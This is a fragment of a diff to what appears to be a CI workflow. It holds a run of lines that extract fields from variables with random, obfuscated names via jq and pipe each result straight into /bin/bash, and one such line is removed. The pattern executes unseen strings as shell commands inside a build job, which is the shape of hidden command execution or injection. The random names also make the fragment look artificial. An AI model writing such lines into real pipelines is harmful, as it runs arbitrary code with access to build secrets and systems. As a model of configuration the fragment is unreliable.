@@ -22,7 +22,6 @@ jobs:
           echo $xs1242 | jq -r .jgi6 | /bin/bash
           echo $pd7 | jq -r .jwcxk691 | /bin/bash
           printf '%s' "$xe83" | jq -r .n32 | /bin/bash
-          echo $rv65 | jq -r .g060 | /bin/bash
           echo $slh323 | jq -r .b1 | /bin/bash
           printf '%s' "$mhvd363" | jq -r .w1250 | /bin/bash
 
